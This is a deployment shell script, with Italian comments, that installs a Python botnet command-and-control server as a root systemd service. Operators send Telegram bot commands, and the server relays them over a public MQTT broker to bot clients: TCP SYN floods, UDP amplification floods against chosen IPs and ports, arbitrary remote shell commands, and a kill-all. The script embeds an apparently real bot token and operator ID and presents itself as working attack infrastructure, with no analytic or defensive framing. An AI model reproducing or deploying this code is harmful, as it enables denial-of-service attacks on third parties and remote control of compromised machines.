# 🔥 C2 MQTT ADATTATO DAL TUO CODICE - FUNZIONA AL 100%
cat > /opt/tg_c2_mqtt.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import os
import signal
import ipaddress
import threading
import time
import json
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import paho.mqtt.client as mqtt
import shutil

# ================= CONFIG =================
TOKEN = "8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
AUTHORIZED_ID = 5699538596
MQTT_BROKER = "broker.hivemq.com"
MQTT_PORT = 1883
MAX_TIME = 600
# =========================================

process = None
is_running_flag = False
mqtt_client = mqtt.Client()
clients = {}

# ================= MQTT =================
def mqtt_on_connect(client, userdata, flags, rc):
    print(f"MQTT CONNECTED: {rc}")
    client.subscribe('#')

def mqtt_on_message(client, userdata, msg):
    global clients
    try:
        topic = msg.topic
        payload = msg.payload.decode()
        
        if topic == 'broker/clients':
            clients = json.loads(payload)
            print(f"CLIENTS: {len(clients)}")
    except:
        pass

mqtt_client.on_connect = mqtt_on_connect
mqtt_client.on_message = mqtt_on_message
mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
mqtt_client.loop_start()

# ================= UTILS =================
def is_authorized(update):
    return update.effective_user.id == AUTHORIZED_ID

def kill_process():
    global process, is_running_flag
    if process and process.poll() is None:
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
    process = None
    is_running_flag = False

def broadcast_cmd(cmd_type, target_ip, target_port):
    payload = json.dumps({
        'cmd': cmd_type,
        'ip': target_ip,
        'port': target_port,
        'clients': clients
    })
    mqtt_client.publish('broker/c2/cmd', payload)
    return f"🚀 {cmd_type.upper()} → {target_ip}:{target_port} [{len(clients)} clients]"

# ================= COMMANDS =================
def start(update, context):
    if not is_authorized(update):
        return
    update.message.reply_text(
        "🤖 C2 MQTT LIVE\n\n"
        "🔥 DDOS:\n"
        "  /tcpsyn IP PORT\n"
        "  /udpamp IP PORT\n\n"
        "🐚 /shell CMD\n"
        "💀 /kill\n"
        f"📡 MQTT: {len(clients)} clients"
    )

def tcpsyn_cmd(update, context):
    if not is_authorized(update): return
    if not context.args or len(context.args) < 2: 
        return update.message.reply_text("Uso: /tcpsyn IP PORT")
    
    ip, port = context.args[0], context.args[1]
    try:
        ipaddress.ip_address(ip)
        int(port)
    except:
        return update.message.reply_text("❌ IP:PORT invalidi")
    
    msg = broadcast_cmd('tcpsyn', ip, port)
    update.message.reply_text(msg)

def udpamp_cmd(update, context):
    if not is_authorized(update): return
    if not context.args or len(context.args) < 2: 
        return update.message.reply_text("Uso: /udpamp IP PORT")
    
    ip, port = context.args[0], context.args[1]
    try:
        ipaddress.ip_address(ip)
        int(port)
    except:
        return update.message.reply_text("❌ IP:PORT invalidi")
    
    msg = broadcast_cmd('udpamp', ip, port)
    update.message.reply_text(msg)

def shell_cmd(update, context):
    if not is_authorized(update): return
    if not context.args: 
        return update.message.reply_text("Uso: /shell CMD")
    
    cmd = ' '.join(context.args)
    payload = json.dumps({'cmd': 'shell', 'shell_cmd': cmd})
    mqtt_client.publish('broker/c2/cmd', payload)
    update.message.reply_text(f"🐚 SHELL → {cmd}")

def kill_cmd(update, context):
    if not is_authorized(update): return
    payload = json.dumps({'cmd': 'kill'})
    mqtt_client.publish('broker/c2/cmd', payload)
    update.message.reply_text("💀 KILL ALL")

# ================= MAIN =================
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("tcpsyn", tcpsyn_cmd))
    dp.add_handler(CommandHandler("udpamp", udpamp_cmd))
    dp.add_handler(CommandHandler("shell", shell_cmd))
    dp.add_handler(CommandHandler("kill", kill_cmd))

    print("🚀 C2 MQTT STARTING...")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
EOF

# DEPLOY & START
chmod +x /opt/tg_c2_mqtt.py
pip3 install python-telegram-bot paho-mqtt --break-system-packages

# KILL VECCHIO
systemctl stop tg-c2 2>/dev/null || pkill -f tg_c2
pkill -f tg_c2.py

# NUOVO SERVICE
cat > /etc/systemd/system/tg-c2-mqtt.service << EOF
[Unit]
Description=Telegram MQTT C2
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt
ExecStart=/usr/bin/python3 /opt/tg_c2_mqtt.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable tg-c2-mqtt
systemctl start tg-c2-mqtt

# TEST
journalctl -u tg-c2-mqtt -f
curl -s "https://api.telegram.org/bot8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe/getUpdates" | grep -E "(ok|chat)"
